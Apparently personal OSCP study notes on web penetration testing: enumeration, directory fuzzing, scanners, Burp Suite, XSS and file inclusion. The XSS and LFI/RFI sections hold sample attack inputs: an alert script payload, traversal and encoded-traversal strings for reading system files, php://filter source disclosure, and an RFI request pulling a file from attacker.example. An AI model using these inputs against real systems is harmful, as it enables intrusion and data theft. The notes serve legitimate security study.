Identify:

```
/login
/register
/forgot-password
/reset-password
/logout
/admin
```

Understand:

```
Unauthenticated
      ↓
Login
      ↓
Normal User
      ↓
Privileged User/Admin
```

For OSCP, pay attention to how authentication affects what endpoints are accessible.

---

## 16. Cookies & Sessions

Inspect cookies:

```
curl -I http://TARGET
```

Look for:

```
Set-Cookie:
```

Questions to answer:

- What session cookie is used?
- Is authentication cookie-based?
- Does the application use multiple cookies?
- Does the cookie reveal technology?
- Does the application behave differently after login?

Don't immediately assume a cookie is exploitable—first understand its purpose.

---

## 17. CMS Enumeration

If you identify WordPress:

```
wpscan --url http://TARGET
```

Look for:

```
WordPress version
Plugins
Themes
Users
Interesting endpoints
```

Other common CMSs include:

```
WordPress
Joomla
Drupal
```

Once the CMS is identified, use its **appropriate enumeration methodology** rather than treating it like a generic website.

---

## 18. Backup & Sensitive Files

Search for common backup/configuration artifacts:

```
/config.php
/config.php.bak
/.env
/backup.zip
/backup.tar.gz
/database.sql
/.git/
/.htaccess
```

Also consider:

```
old
backup
bak
tmp
test
dev
staging
```

A discovered `.git` directory, for example, can potentially expose application source history and configuration information.

---

## 19. Error Messages

Triggering normal invalid requests can reveal useful information.

Example:

```
/product?id=abc
```

Potential information:

```
Application framework
Programming language
Database type
File paths
Debug configuration
```

Look for:

```
PHP errors
ASP.NET errors
Java stack traces
Python tracebacks
SQL errors
```

Errors are often valuable **fingerprinting clues**, even when they aren't directly exploitable.

---

## 20. Important Files/Paths Checklist

```
/
├── robots.txt
├── sitemap.xml
├── .git/
├── .env
├── .htaccess
├── admin/
├── login/
├── api/
├── swagger/
├── docs/
├── upload/
├── uploads/
├── backup/
├── dev/
├── test/
└── staging/
```

---

## 21. OSCP Enumeration Checklist

```
[ ] Identify open web ports
[ ] Identify HTTP/HTTPS
[ ] Identify web server
[ ] Identify technologies
[ ] Check HTTP headers
[ ] Inspect page source
[ ] Inspect JavaScript
[ ] Check robots.txt
[ ] Check sitemap.xml
[ ] Directory enumeration
[ ] File-extension enumeration
[ ] Check 403 responses
[ ] Check redirects
[ ] Enumerate virtual hosts
[ ] Identify APIs
[ ] Identify parameters
[ ] Identify authentication
[ ] Inspect cookies
[ ] Identify CMS
[ ] Search for backups
[ ] Search for exposed configuration
[ ] Review error messages
[ ] Document everything
```

## The OSCP mindset

Don't think:

```
"I found a website."
```

Think:

```
TARGET
 │
 ├── Web Server
 │
 ├── Technologies
 │
 ├── Directories
 │
 ├── Files
 │
 ├── Virtual Hosts
 │
 ├── APIs
 │
 ├── Parameters
 │
 ├── Authentication
 │
 └── Application Functions
          ↓
      Attack Surface
```

**Web enumeration is about building the attack surface map.** Exploitation comes after you understand what the application exposes.
# ==Fuzzing Directories==
![[images (1).png|563]]

## 1. What is Directory Fuzzing?

**Directory fuzzing** is the process of discovering hidden or unlinked directories, files, and endpoints on a web server by sending requests using a wordlist.

It can reveal:

- Hidden directories
- Admin panels
- Login pages
- Backup files
- Configuration files
- API endpoints
- Development/staging directories
- Upload directories
- Sensitive files

Example:

```
http://target.com/
├── index.php
├── images/
├── admin/          ← discovered
├── backup/         ← discovered
└── api/            ← discovered
```

---

## 2. Main Tools

|Tool|Use|
|---|---|
|`ffuf`|Fast web fuzzing|
|`gobuster`|Directory/DNS/vhost enumeration|
|`feroxbuster`|Recursive content discovery|
|`dirsearch`|Web path discovery|
|`wfuzz`|Flexible web fuzzing|

For OSCP, **`ffuf` and `gobuster`** are especially useful.

---

## 3. Gobuster

### Basic directory scan

```
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
```

### Useful options

```
gobuster dir -u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt \
-t 50 \
-x php,txt,html,bak
```

- `-u` → target URL
- `-w` → wordlist
- `-t` → number of threads
- `-x` → file extensions

### Example

```
gobuster dir -u http://10.10.10.10 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,bak,zip
```

---

## 4. FFUF

### Basic directory fuzzing

```
ffuf -u http://TARGET/FUZZ \
-w /usr/share/wordlists/dirb/common.txt
```

`FUZZ` is replaced by every word in the wordlist.

Example:

```
GET /admin
GET /login
GET /backup
GET /uploads
...
```

### File extension fuzzing

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt \
-e .php,.txt,.html,.bak
```

### Common useful extensions

```
.php
.txt
.html
.bak
.old
.zip
.tar.gz
.conf
```

---

## 5. Filtering False Positives

A web server may return the same response for nonexistent paths.

For example:

```
/random123      → 200
/admin          → 200
/backup         → 200
```

If every invalid path returns `200`, filtering by status code won't be enough.

### Filter by response size

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt \
-fs 1234
```

`-fs` = filter response size.

### Filter status codes

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt \
-fc 404
```

`-fc` = filter status codes.

### Match specific status codes

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt \
-mc 200,204,301,302,307,401,403
```

---

## 6. Recursive Discovery

If you discover:

```
/admin/
```

you should investigate inside it.

With `feroxbuster`:

```
feroxbuster -u http://TARGET -w wordlist.txt
```

Or with Gobuster:

```
gobuster dir -u http://TARGET/admin \
-w wordlist.txt
```

Example:

```
/admin/
├── login.php
├── users/
├── config/
└── backup/
```

---

## 7. Important HTTP Status Codes

|Code|Meaning|What it can indicate|
|---|---|---|
|`200`|OK|Resource exists|
|`204`|No Content|Resource exists|
|`301`|Permanent Redirect|Often directory|
|`302`|Temporary Redirect|Redirect/login|
|`307`|Temporary Redirect|Redirect|
|`401`|Unauthorized|Authentication required|
|`403`|Forbidden|Resource may exist|
|`404`|Not Found|Usually nonexistent|
|`405`|Method Not Allowed|Endpoint exists but method differs|
|`429`|Too Many Requests|Rate limiting|

### Important OSCP point

**Don't automatically ignore `403`.**

For example:

```
/admin → 403
```

may strongly suggest that `/admin` exists but access is restricted.

---

## 8. Interesting Findings

Pay special attention to:

### Administrative interfaces

```
/admin
/administrator
/admin.php
/management
/dashboard
```

### Authentication

```
/login
/signin
/auth
/register
```

### Backups

```
/backup
/backups
/old
/archive
```

Potential files:

```
config.php.bak
index.php.old
database.sql
backup.zip
```

### Development

```
/dev
/test
/staging
/debug
```

### APIs

```
/api
/api/v1
/api/v2
/swagger
/docs
```

### Uploads

```
/upload
/uploads
/files
/media
```

---

## 9. Virtual Host / Host Header Fuzzing

Directory fuzzing discovers paths:

```
TARGET/FUZZ
```

Virtual-host fuzzing discovers hostnames:

```
FUZZ.target.com
```

With Gobuster:

```
gobuster vhost -u http://target.com \
-w subdomains.txt
```

With FFUF:

```
ffuf -u http://target.com \
-H "Host: FUZZ.target.com" \
-w subdomains.txt
```

This can uncover applications such as:

```
dev.target.com
test.target.com
admin.target.com
staging.target.com
```

---

## 10. Wordlists

Common Kali locations:

```
/usr/share/wordlists/
```

Useful collections include:

```
/usr/share/wordlists/dirb/
/usr/share/wordlists/dirbuster/
```

SecLists is also extremely useful:

```
Discovery/Web-Content/
```

Different applications require different wordlists.

For example:

```
Generic website
    ↓
common.txt

Large application
    ↓
medium/large wordlist

PHP application
    ↓
PHP-specific extensions/words

API
    ↓
API endpoint wordlist
```

---

## 11. OSCP Methodology

A good workflow:

```
1. Identify web server
        ↓
2. Browse the website manually
        ↓
3. Check robots.txt
        ↓
4. Check sitemap.xml
        ↓
5. Directory fuzzing
        ↓
6. Extension fuzzing
        ↓
7. Analyze interesting responses
        ↓
8. Enumerate discovered directories
        ↓
9. Look for backups/configs/API/admin panels
        ↓
10. Connect findings to potential vulnerabilities
```

Useful manual checks:

```
/robots.txt
/sitemap.xml
/.well-known/
/server-status
```

---

## 12. Practical OSCP Command Set

### Gobuster

```
gobuster dir -u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt
```

```
gobuster dir -u http://TARGET \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,bak,zip
```

### FFUF

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt
```

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt \
-e .php,.txt,.bak,.html
```

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt \
-fc 404
```

### Recursive investigation

```
gobuster dir -u http://TARGET/admin \
-w wordlist.txt
```

---

## OSCP Key Takeaways

> **Directory fuzzing ≠ vulnerability scanning.**

Its primary purpose is **content discovery**.

Remember:

```
Directory fuzzing
       ↓
Discover attack surface
       ↓
Analyze discovered resources
       ↓
Enumerate further
       ↓
Identify vulnerability
       ↓
Exploit (if applicable)
```

The most important habits for OSCP are **checking `200`, `301/302`, `401`, and especially `403` responses**, filtering false positives, testing extensions, and recursively enumerating interesting directories.

# ==Web Application Security Scanner's==
![[Pasted image 20261005173056.png|700]]

## 1. What is a Web Application Security Scanner?
![[Pasted image 20260909170813.png]]

A **Web Application Security Scanner** is an automated tool used to identify potential vulnerabilities in web applications.

Common examples:

- **OWASP ZAP**
- **Burp Suite Scanner**
- **Nikto**
- **Nuclei**
- **Nessus**
- **OpenVAS / Greenbone**

> For OSCP, scanners are useful for **enumeration and finding leads**, but you should manually verify important findings.

---

## 2. What Can a Web Scanner Detect?

Typical findings include:

|Category|Examples|
|---|---|
|Misconfiguration|Exposed files, insecure headers|
|Authentication|Weak/default authentication issues|
|Injection|SQLi, XSS, SSTI|
|File Issues|LFI, path traversal|
|Information Disclosure|Version information, sensitive files|
|TLS/SSL|Weak protocols/ciphers|
|Access Control|Some IDOR/BAC indicators|
|Known CVEs|Vulnerable software/components|
|Web Server|Dangerous methods, misconfiguration|
|Directory Exposure|Directory listing, backup files|

---

## 3. Important OSCP Tools

### Nikto

A web server scanner focused mainly on:

- Dangerous files
- Default files
- Misconfigurations
- Outdated server components
- HTTP headers
- Known web-server issues

Basic usage:

```
nikto -h http://10.10.10.10
```

HTTPS:

```
nikto -h https://10.10.10.10
```

---

### Nuclei

Nuclei is a **template-based vulnerability scanner**.

It can detect:

- Known CVEs
- Misconfigurations
- Exposed panels
- Default credentials indicators
- Information disclosure
- Web vulnerabilities

Example:

```
nuclei -u http://10.10.10.10
```

Scan multiple targets:

```
nuclei -l targets.txt
```

Specific tags:

```
nuclei -u http://10.10.10.10 -tags cve
```

**OSCP mindset:** use Nuclei to generate leads, then manually validate them.

---

### OWASP ZAP

OWASP ZAP is useful for:

- Spidering
- Passive scanning
- Active scanning
- Finding web vulnerabilities
- Intercepting HTTP requests
- Understanding application behavior

Basic workflow:

```
Browser
   ↓
ZAP Proxy
   ↓
Web Application
```

---

### Burp Suite

Burp Suite is especially useful for manual testing.

Important components:

```
Proxy
Repeater
Intruder
Decoder
Comparer
Scanner
```

For OSCP, **Proxy + Repeater** are particularly important because they allow you to understand and modify requests manually.

---

## 4. Scanner vs Manual Testing

### Automated Scanner

```
Target
  ↓
Scanner
  ↓
Potential vulnerability
  ↓
Manual verification
  ↓
Exploit
```

### Manual Testing

```
Target
  ↓
Understand application
  ↓
Enumerate functionality
  ↓
Analyze requests
  ↓
Manipulate parameters
  ↓
Identify vulnerability
  ↓
Exploit
```

**Important:** A scanner finding is **not automatically a confirmed vulnerability**.

---

## 5. Typical OSCP Workflow

A practical workflow:

```
1. Identify web ports
        ↓
2. Identify web technology
        ↓
3. Browse the application
        ↓
4. Directory/file enumeration
        ↓
5. Run web scanners
        ↓
6. Inspect interesting findings
        ↓
7. Manually verify
        ↓
8. Search for exploitation paths
```

Example:

```
nmap -sC -sV -p80,443 10.10.10.10
```

Then:

```
nikto -h http://10.10.10.10
```

And:

```
nuclei -u http://10.10.10.10
```

---

## 6. Scanner Limitations

Scanners can produce:

### False Positive

Scanner says:

```
SQL Injection detected
```

But manual testing shows the parameter is not actually injectable.

### False Negative

Scanner reports nothing, but manual testing discovers:

```
IDOR
Authentication bypass
Business logic flaw
Privilege escalation
```

This is why **manual enumeration is essential**.

---

## 7. What to Record

For OSCP notes, record:

```
Target:
IP:
Port:
Protocol:
Web Server:
Technology:
Framework:
Interesting URLs:
Directories:
Parameters:
Login:
Potential vulnerabilities:
Scanner results:
Manual verification:
Exploitation path:
```

---

## 8. OSCP Exam Mindset

Don't do:

```
Run scanner
↓
See nothing
↓
Give up
```

Instead:

```
Scanner
   +
Directory Enumeration
   +
Technology Enumeration
   +
Manual HTTP Analysis
   +
Source Code / JS Analysis
   +
Parameter Testing
   =
Better Coverage
```

### Key takeaway

> **Web scanners are enumeration and vulnerability-discovery aids, not replacements for manual web application testing.**

For OSCP, prioritize **understanding the application and validating scanner findings** rather than blindly trusting scanner output.
# ==Burp Suite== 
![[BurpSuite_logo.svg.webp|413]]

## 1. What is Burp Suite?

Burp Suite is a web application security testing platform used to **intercept, inspect, modify, and replay HTTP/HTTPS requests**.

For OSCP, the most important parts are:

```
Proxy
Repeater
Intruder
Decoder
Comparer
```

---

## 2. Proxy

**Proxy** sits between your browser and the web application.

```
Browser
   ↓
Burp Proxy
   ↓
Web Server
```

It allows you to see:

- HTTP requests
- HTTP responses
- Cookies
- Headers
- Parameters
- Authentication tokens
- API endpoints

Example request:

```
GET /profile?id=10 HTTP/1.1
Host: target.htb
Cookie: session=abc123
```

You can intercept it and modify:

```
GET /profile?id=11 HTTP/1.1
```

This is useful for testing things such as **access control / IDOR**.

---

## 3. Repeater 

**Repeater is one of the most important Burp features for OSCP.**

It allows you to send the same request repeatedly while modifying it.

Typical workflow:

```
Proxy
  ↓
Capture Request
  ↓
Send to Repeater
  ↓
Modify
  ↓
Send
  ↓
Analyze Response
```

Example:

```
GET /api/user/100 HTTP/1.1
Host: target.htb
Cookie: session=USER_SESSION
```

Change:

```
GET /api/user/101 HTTP/1.1
```

Then compare the response.

Useful for testing:

- IDOR
- Authentication issues
- Access control
- Parameter manipulation
- Input validation
- API behavior
- HTTP methods

---

## 4. Intruder

**Intruder** automates sending many variations of a request.

Useful for:

- Parameter testing
- Credential testing in authorized labs
- Enumeration
- Fuzzing
- Identifying different responses

Concept:

```
Original Request
       ↓
Mark Payload Position
       ↓
Payload List
       ↓
Intruder
       ↓
Many Requests
       ↓
Compare Responses
```

Example:

```
GET /page?id=§1§ HTTP/1.1
```

Possible values:

```
1
2
3
4
5
...
```

For OSCP, understand **why the responses differ**, rather than simply launching large automated attacks.

---

## 5. Decoder

Decoder is used to transform encoded data.

Common formats:

- URL encoding
- Base64
- Hex
- HTML encoding

Example:

```
SGVsbG8=
```

Base64 decode:

```
Hello
```

Very useful when you encounter:

```
Cookie values
JWT components
Parameters
Encoded IDs
Application data
```

---

## 6. Comparer

Comparer allows you to compare two pieces of data.

Useful when testing:

```
Request A → Response A
Request B → Response B
```

You can identify differences in:

- Response length
- Headers
- Cookies
- JSON fields
- Error messages
- Status codes

This can be particularly useful when investigating access-control behavior.

---

## 7. HTTP History

Burp records requests made through the proxy.

You can review:

```
GET /
GET /login
POST /login
GET /dashboard
GET /api/users
GET /api/profile
```

This is extremely useful during OSCP because you can discover application functionality that you might otherwise overlook.

---

## 8. Target / Site Map

Burp's **Target/Site Map** organizes discovered application resources.

Example:

```
target.htb
│
├── /
├── /login
├── /admin
├── /api
│   ├── /users
│   ├── /profile
│   └── /upload
└── /static
```

Use it to understand the application's attack surface.

---

## 9. Testing Parameters

Suppose you find:

```
GET /download?file=report.pdf
```

The parameter:

```
file=
```

is interesting.

You can send it to Repeater and investigate how the application handles different authorized inputs.

Other interesting parameters:

```
id=
user=
file=
path=
page=
url=
redirect=
cmd=
query=
search=
```

The important skill is recognizing **which parameters affect application behavior**.

---

## 10. Authentication Testing

Burp lets you inspect authentication requests.

Example:

```
POST /login HTTP/1.1

username=admin&password=password
```

You can examine:

- Login requests
- Session cookies
- Authorization headers
- Redirects
- Logout behavior
- Password-reset flows
- API authentication

For example:

```
Authorization: Bearer eyJ...
```

or:

```
Cookie: session=abc123
```

---

## 11. Cookies

Look for:

```
Cookie: session=abc123
```

and response:

```
Set-Cookie: session=abc123; HttpOnly; Secure
```

Understand the purpose of:

|Attribute|Purpose|
|---|---|
|`HttpOnly`|Helps prevent JavaScript from reading the cookie|
|`Secure`|Cookie sent over HTTPS|
|`SameSite`|Controls cross-site cookie sending|
|`Path`|Limits applicable URL path|
|`Domain`|Controls applicable domain|

---

## 12. Useful Burp Workflow for OSCP

```
        Nmap
          ↓
    Find HTTP/HTTPS
          ↓
      Open Browser
          ↓
     Configure Burp
          ↓
    Browse Application
          ↓
     HTTP History
          ↓
      Site Map
          ↓
   Identify Interesting
      Requests
          ↓
       Repeater
          ↓
    Modify Parameters
          ↓
   Analyze Responses
          ↓
    Identify Vulnerability
          ↓
       Exploitation
```

---

## 13. Burp + Other OSCP Tools

Burp should **not** replace your other enumeration tools.

A good workflow is:

```
Nmap
 ↓
Web Enumeration
 ↓
Gobuster / Feroxbuster
 ↓
Browser + Burp
 ↓
HTTP History
 ↓
Repeater
 ↓
Manual Testing
```

For example:

```
nmap -sC -sV -p80,443 TARGET
```

Then discover directories with your preferred enumeration tool and investigate interesting endpoints through Burp.

---

## 14. Most Important Burp Features for OSCP

###  Priority 1

**Proxy**

Understand and intercept HTTP traffic.

**Repeater**

Manually manipulate and replay requests.

###  Priority 2

**HTTP History**

Understand what the application is actually doing.

**Target / Site Map**

Map the attack surface.

###  Priority 3

**Intruder**

Automate controlled parameter/payload testing.

**Decoder**

Understand encoded application data.

**Comparer**

Compare requests/responses.

---

## OSCP Cheat Sheet

```
Burp Suite
│
├── Proxy
│   └── Intercept HTTP/HTTPS
│
├── HTTP History
│   └── Review application traffic
│
├── Target / Site Map
│   └── Map application
│
├── Repeater 

│   └── Manual request manipulation
│
├── Intruder
│   └── Automated request testing
│
├── Decoder
│   └── Encode / Decode data
│
└── Comparer
    └── Compare requests/responses
```

**The key OSCP skill isn't memorizing Burp's buttons—it's being able to take an interesting HTTP request, modify one thing at a time, observe the response, and reason about what the application is doing.**
# ==Cross Site Scripting XSS==
![[What-is-Cross-site-Scripting-XSS-and-how-can-you-fix-it_.webp]]
## 1. What is XSS?

**Cross-Site Scripting (XSS)** is a client-side injection vulnerability where an attacker causes a victim's browser to execute attacker-controlled JavaScript in the context of a trusted web application.

### Main impact

- Execute JavaScript in victim's browser
- Perform actions as the victim
- Access data available to JavaScript
- Modify page content
- Phishing / UI manipulation
- Steal sensitive information accessible to the script
- Sometimes chain with CSRF, account takeover, or other vulnerabilities

---

## 2. Types of XSS

|Type|Description|Persistence|
|---|---|---|
|**Reflected XSS**|Payload comes from the request and is immediately reflected in the response|❌|
|**Stored XSS**|Payload is saved by the application and executed when users view it|✅|
|**DOM-Based XSS**|JavaScript processes attacker-controlled input and writes it into a dangerous DOM sink|❌/depends|

---

## 3. Reflected XSS

The application takes user input and reflects it into the HTML response without proper encoding.

Example:

```
https://target.com/search?q=hello
```

If the application renders:

```
<h1>Search results for hello</h1>
```

and input isn't properly handled, an XSS payload may execute.

### Common injection points

```
GET parameters
POST parameters
HTTP headers
URL fragments
Search fields
Error messages
Redirect parameters
```

---

## 4. Stored XSS

The attacker submits malicious input that gets stored in the application's database.

Typical locations:

```
Comments
User profiles
Messages
Support tickets
Product reviews
Forum posts
Names / descriptions
```

Example:

```
<script>alert(document.domain)</script>
```

If stored and later rendered unsafely, every user who visits the affected page may execute the script.

### Why Stored XSS is often more serious

The attacker doesn't necessarily need to send the victim a malicious URL.

```
Attacker
   ↓
Submit payload
   ↓
Application stores payload
   ↓
Victim visits page
   ↓
JavaScript executes
```

---

## 5. DOM-Based XSS

DOM XSS occurs primarily in **client-side JavaScript**.

The server may return completely normal HTML, but JavaScript takes attacker-controlled data and inserts it into a dangerous DOM sink.

Example source:

```
location.hash
```

Dangerous sink:

```
element.innerHTML = location.hash;
```

Conceptually:

```
Attacker-controlled input
        ↓
JavaScript source
        ↓
DOM manipulation
        ↓
Dangerous sink
        ↓
JavaScript execution
```

---

## 6. Important XSS Sources

When testing DOM XSS, look for attacker-controlled **sources**.

Common examples:

```
location
location.href
location.search
location.hash
document.URL
document.referrer
window.name
postMessage()
```

---

## 7. Important XSS Sinks

A **sink** is a function/property that can potentially interpret attacker-controlled data as HTML or JavaScript.

Important examples:

```
innerHTML
outerHTML
document.write()
document.writeln()
eval()
setTimeout()
setInterval()
Function()
```

Also pay attention to:

```
element.insertAdjacentHTML()
```

### Dangerous pattern

```
element.innerHTML = userInput;
```

### Safer alternative

```
element.textContent = userInput;
```

---

## 8. Basic XSS Testing Methodology

### Step 1 — Find input points

Look for:

```
URL parameters
Search boxes
Forms
Comments
Profile fields
HTTP headers
Cookies
POST bodies
JSON parameters
```

---

### Step 2 — Test reflection

Use a harmless unique marker:

```
xss_test_123
```

Then determine:

```
Is it reflected?
Where is it reflected?
How is it encoded?
Is it inside HTML?
Attribute?
JavaScript?
CSS?
```

---

### Step 3 — Identify the context

The same input can appear in different contexts.

### HTML context

```
<div>INPUT</div>
```

### Attribute context

```
<input value="INPUT">
```

### JavaScript context

```
var search = "INPUT";
```

### URL context

```
<a href="INPUT">
```

The context determines whether the input can break out of its current syntax.

---

## 9. Context Matters

Don't immediately assume:

```
Input reflected = XSS
```

You need:

```
Input
 ↓
Reflection
 ↓
Context
 ↓
Encoding / filtering
 ↓
Can attacker-controlled syntax escape the context?
 ↓
JavaScript execution?
```

---

## 10. HTML Encoding

A properly encoded value might become:

```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
&  →  &amp;
```

For example:

```
<div>&lt;script&gt;...</div>
```

The browser displays it as text rather than interpreting it as HTML.

---

## 11. XSS Filter / WAF Testing

Applications may filter obvious payloads.

Don't focus only on:

```
<script>...</script>
```

Understand **why** the input is dangerous.

Test the application's behavior around:

```
HTML tags
Attributes
Event handlers
JavaScript URLs
SVG
DOM manipulation
Encoding
Case transformation
Character filtering
```

For authorized OSCP labs, the goal is to understand the parser/context rather than blindly trying payload lists.

---

## 12. XSS in HTTP Headers

Potentially interesting headers include:

```
User-Agent
Referer
X-Forwarded-For
Host
```

But a header alone isn't XSS.

The application must:

```
Receive header
      ↓
Reflect/store it
      ↓
Render it in a browser context
      ↓
Without proper encoding
```

---

## 13. Cookie Security

Important cookie flags:

### HttpOnly

```
HttpOnly
```

Prevents JavaScript from reading the cookie through:

```
document.cookie
```

It does **not** prevent XSS itself.

### Secure

Cookie is sent only over HTTPS.

### SameSite

Controls cross-site cookie sending behavior.

---

## 14. CSP

**Content Security Policy (CSP)** can reduce the impact of XSS.

Example:

```
Content-Security-Policy: default-src 'self'
```

CSP can restrict:

```
Where scripts can load from
Inline JavaScript
eval()
Frames
Images
Connections
```

### OSCP mindset

Don't treat:

```
CSP exists
```

as:

```
XSS impossible
```

Instead understand what the policy permits and whether the application is still vulnerable.

---

## 15. Useful Browser DevTools

### Elements

Look for:

```
Where is my input reflected?
What HTML was generated?
```

### Sources

Search JavaScript for:

```
innerHTML
outerHTML
document.write
eval
location
location.hash
location.search
```

### Network

Inspect:

```
GET parameters
POST bodies
Headers
Cookies
API requests
Responses
```

---

## 16. Burp Suite Workflow

A basic OSCP workflow:

```
Burp Proxy
    ↓
Browse application
    ↓
Capture requests
    ↓
Send interesting request to Repeater
    ↓
Modify parameters
    ↓
Observe reflection
    ↓
Determine context
    ↓
Test safely
    ↓
Confirm browser execution
```

Useful Burp features:

```
Proxy
Repeater
HTTP history
Decoder
Intruder
```

---

## 17. XSS vs HTML Injection

### HTML Injection

Attacker controls HTML:

```
HTML modification
```

### XSS

Attacker achieves script execution:

```
HTML/DOM injection
        ↓
JavaScript execution
```

Therefore:

```
HTML Injection ≠ automatically XSS
```

---

## 18. XSS Impact

Potential impact depends heavily on the application's context.

Possible consequences:

```
Account actions
Data exposure
Session abuse
UI manipulation
Phishing
Credential theft
CSRF-like actions
Admin actions
Application compromise chains
```

A particularly important OSCP scenario:

```
XSS
 ↓
Victim/admin visits page
 ↓
JavaScript executes with victim privileges
 ↓
Sensitive application action
```

---

## 19. XSS Testing Checklist

```
[ ] Identify all user-controlled inputs
[ ] Test GET parameters
[ ] Test POST parameters
[ ] Test JSON parameters
[ ] Test search functionality
[ ] Test forms
[ ] Test comments
[ ] Test profile fields
[ ] Test HTTP headers
[ ] Check reflected input
[ ] Check stored input
[ ] Inspect DOM JavaScript
[ ] Identify sources
[ ] Identify sinks
[ ] Determine injection context
[ ] Check output encoding
[ ] Check filtering
[ ] Check CSP
[ ] Check cookie flags
[ ] Confirm actual JavaScript execution
[ ] Document the vulnerable parameter and context
```

---

## 20. OSCP Exam Mindset

For OSCP, don't spend excessive time trying hundreds of XSS payloads.

Think:

```
INPUT
  ↓
REFLECTION / STORAGE
  ↓
CONTEXT
  ↓
FILTERING / ENCODING
  ↓
SINK
  ↓
EXECUTION
  ↓
IMPACT
```

The most important concepts to remember are:

> **Reflected vs Stored vs DOM XSS**

> **Source vs Sink**

> **Injection context**

> **Encoding vs filtering**

> **XSS requires JavaScript execution, not merely input reflection.**

# ==Local and Remote File Inclusion (LFI/RFI)==

![[images (1).jpeg|525]]
## 1. File Inclusion

**File Inclusion** occurs when a web application allows user-controlled input to determine which file the server loads or executes.

Main types:

|Type|Meaning|Typical Impact|
|---|---|---|
|**LFI**|Local File Inclusion|Read local files, sometimes RCE|
|**RFI**|Remote File Inclusion|Include a file hosted remotely|
|**LFI → RCE**|LFI chained with another primitive|Remote Code Execution|

> **Key idea:** LFI normally reads/includes a file **from the target server**, while RFI attempts to include a file **from a remote server**.

---

## 2. LFI — Local File Inclusion

LFI happens when an application includes a local file based on user input.

Example vulnerable pattern:

```
<?php
include($_GET['page']);
?>
```

Normal request:

```
/page.php?page=home.php
```

Potentially vulnerable input:

```
/page.php?page=../../../../etc/passwd
```

The `../` sequence moves up directories.

---

## 3. Directory Traversal

LFI is commonly associated with **Path Traversal**.

Basic traversal:

```
../
../../
../../../
../../../../
```

Linux:

```
/etc/passwd
/etc/hosts
/etc/hostname
/proc/self/environ
```

Windows:

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
```

URL-encoded traversal:

```
..%2f
%2e%2e%2f
%2e%2e/
```

Double encoding may sometimes bypass weak filters:

```
%252e%252e%252f
```

---

## 4. Finding LFI

Look for parameters that appear to reference files:

```
?page=
?file=
?path=
?filename=
?document=
?folder=
?template=
?include=
?view=
?page_name=
?lang=
?module=
```

Examples:

```
/index.php?page=about
/index.php?file=header.php
/download.php?file=report.pdf
/view.php?template=home
```

### Interesting indicators

An application may be vulnerable if changing the parameter causes:

- Contents of a local file to appear
- PHP warnings/errors mentioning filesystem paths
- `No such file or directory`
- `failed to open stream`
- Different responses for different paths
- Application source code or configuration information to appear

---

## 5. Useful Linux Files

For OSCP, remember these:

### `/etc/passwd`

```
/etc/passwd
```

Useful for:

- Confirming LFI
- Identifying local users
- Understanding the target environment

### `/etc/hosts`

```
/etc/hosts
```

Can reveal local hostnames.

### `/etc/hostname`

```
/etc/hostname
```

Can reveal the machine hostname.

### `/proc/self/environ`

```
/proc/self/environ
```

May expose environment variables.

### `/proc/self/cmdline`

```
/proc/self/cmdline
```

Can reveal the command used to start the process.

---

## 6. Windows Files

Common files to test in a Windows environment:

```
C:\Windows\win.ini
```

```
C:\Windows\System32\drivers\etc\hosts
```

Potential application locations:

```
C:\inetpub\wwwroot\
```

---

## 7. PHP Wrappers

PHP has stream wrappers that can make LFI significantly more interesting.

## `php://filter`

One of the most important OSCP techniques.

It can sometimes allow you to **read PHP source code without executing it**.

Conceptually:

```
php://filter/convert.base64-encode/resource=index.php
```

The application may return Base64-encoded source.

Decode it locally:

```
echo 'BASE64_DATA' | base64 -d
```

This can expose:

- Database credentials
- API keys
- File paths
- Include statements
- Application logic
- Other vulnerabilities

### Why this is useful

If you find:

```
?page=index.php
```

instead of simply trying to include it, `php://filter` may let you inspect the source.

---

## 8. LFI → Source Code Disclosure

A common OSCP chain:

```
LFI
 ↓
Read application source
 ↓
Find credentials / paths / functionality
 ↓
Find another attack primitive
 ↓
Potential RCE
```

This is often more valuable than simply reading `/etc/passwd`.

---

## 9. LFI → RCE

**LFI does not automatically mean RCE.**

You generally need another primitive that causes attacker-controlled content to become executable.

Common conceptual chains include:

```
LFI + Log Poisoning → RCE
```

```
LFI + Upload → RCE
```

```
LFI + Session File → RCE
```

```
LFI + Writable File → RCE
```

The exact technique depends heavily on the server and application.

---

## 10. LFI + Log Poisoning

If the application allows you to include a server log containing attacker-controlled content, that content may be interpreted by the server.

Conceptually:

```
Attacker-controlled request
          ↓
Web server log
          ↓
LFI includes log
          ↓
Server interprets injected content
          ↓
Potential RCE
```

Common log locations vary by configuration.

Linux examples may include:

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
```

**Important:** paths are configuration-dependent; don't assume they exist.

---

## 11. LFI + File Upload

Another common chain:

```
Upload malicious/controlled file
          ↓
File is stored on server
          ↓
LFI includes uploaded file
          ↓
Server interprets executable content
          ↓
RCE
```

This requires the uploaded file to be both:

1. Reachable by the LFI
2. Interpreted/executed by the server

Simply uploading a `.php` file isn't enough if the application stores it somewhere that cannot be included or executed.

---

## 12. LFI + Session Files

Some PHP applications store session data in files.

Conceptually:

```
Session data
     ↓
Stored in filesystem
     ↓
Attacker controls part of session data
     ↓
LFI includes session file
     ↓
Potential code execution
```

This depends on:

- PHP configuration
- Session storage location
- Ability to control session contents
- How the included data is interpreted

---

## 13. RFI — Remote File Inclusion

RFI occurs when the application allows a **remote resource** to be included.

Conceptually:

```
Target
   ↓
include("http://attacker-server/file")
   ↓
Attacker-controlled remote file
```

Example vulnerable code:

```
include($_GET['page']);
```

Potential request:

```
?page=http://attacker.example/file
```

Whether this works depends on the server's configuration.

For PHP, remote URL inclusion historically depends on configuration such as:

```
allow_url_include
```

---

## 14. RFI vs LFI

||LFI|RFI|
|---|---|---|
|File location|Target server|Remote server|
|Traversal|Common|Usually unnecessary|
